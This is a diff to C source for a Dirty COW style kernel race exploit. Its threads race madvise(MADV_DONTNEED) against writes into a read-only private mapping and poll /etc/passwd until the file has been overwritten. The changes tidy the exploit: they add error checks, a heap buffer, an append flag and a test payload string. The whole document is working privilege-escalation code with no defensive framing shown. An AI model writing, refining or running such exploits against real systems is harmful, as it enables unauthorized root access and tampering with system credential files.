@@ -40,9 +40,9 @@ typedef struct payload_info {
 	char *string;
 	off_t offset;
 	void *loc_in_mem;
-    int target_fd;
-    int input_fd;
-    bool append;
+	int target_fd;
+	int input_fd;
+	bool append;
 } PayloadInfo;
 
 // Write payload to mmap'd memory
@@ -57,7 +57,6 @@ void *writer_thread(void *arg) {
 		lseek(fd, (uintptr_t) info->loc_in_mem + info->offset, SEEK_SET);
 		write(fd, str, strlen(str));
 	}
-	printf("write finished\n");
 
 	return NULL;
 }
@@ -69,28 +68,33 @@ void *madviser_thread(void *arg) {
 	for (int i = 0; i < THREAD_ITERATIONS && !stop; i++) {
 		madvise(info->loc_in_mem, 100, MADV_DONTNEED);
 	}
-	printf("Madviser finished\n");
 	return NULL;
 }
 
 void *waitForWrite(void *arg) {
 	PayloadInfo *info = arg;
 	int len = strlen(info->string);
-	char buf[len];
+	char *buf = calloc(len, sizeof(char));
+	int fd, seek;
 
 	for(;;) {
-		FILE *fp = fopen("/etc/passwd", "rb");
-		fseek(fp, info->offset, SEEK_SET);
-		fread(buf, len, 1, fp);
+		fd = open("/etc/passwd", O_RDONLY);
+		ERR_IF(fd < 0);
+		seek = lseek(fd, info->offset, SEEK_SET);
+		ERR_IF(read(fd, buf, len) < 0);
 
-		if(memcmp(buf, info->string, len) == 0) {
+		if(memcmp(buf, info->string, len) == 0 && !info->append) {
 			printf("Target file is overwritten\n");
 			break;
 		}
 
-		fclose(fp);
+		// need to handle append differently
+
+		close(fd);
 		sleep(1);
 	}
+
+	free(buf);
 	stop = 1;
 	printf("Stop set to 1\n"); 
 
@@ -201,6 +205,9 @@ int main(int argc, char *argv[]) {
 	info.loc_in_mem = mmap(NULL, file_info.st_size, PROT_READ, MAP_PRIVATE, info.target_fd, 0);
 
 	pthread_t thread_1, thread_2, thread_3;
+
+	char string[] = "Test insert string";
+	info.string = string;
 
 	ERR_IF_PTHREAD(pthread_create(&thread_1, NULL, madviser_thread, &info));
 	ERR_IF_PTHREAD(pthread_create(&thread_2, NULL, writer_thread, &info));
